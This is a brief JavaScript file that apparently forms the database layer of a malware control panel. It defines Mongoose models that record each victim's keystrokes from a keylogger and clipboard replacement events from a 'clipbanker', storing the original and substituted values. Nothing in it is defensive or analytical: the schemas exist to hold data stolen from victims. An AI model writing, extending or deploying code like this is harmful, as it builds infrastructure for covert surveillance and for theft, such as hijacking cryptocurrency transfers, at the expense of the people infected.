const mongoose = require('mongoose');

// Define base event schema as a plain object
const baseEventFields = {
  type: { type: String, required: true, enum: ['keylogger', 'clipbanker'] },
  victim: { type: String, required: true },
  timestamp: { type: Date, default: Date.now }
};

// Keylogger event: logs every keystroke
const KeyloggerEventSchema = new mongoose.Schema({
  key: { type: String, required: true }
});
KeyloggerEventSchema.add(baseEventFields);

// Clipbanker event: logs clipboard replacement events
const ClipbankerEventSchema = new mongoose.Schema({
  original: { type: String, required: true },
  replaced: { type: String, required: true }
});
ClipbankerEventSchema.add(baseEventFields);

const KeyloggerEvent = mongoose.model('KeyloggerEvent', KeyloggerEventSchema);
const ClipbankerEvent = mongoose.model('ClipbankerEvent', ClipbankerEventSchema);

module.exports = {
  KeyloggerEvent,
  ClipbankerEvent
};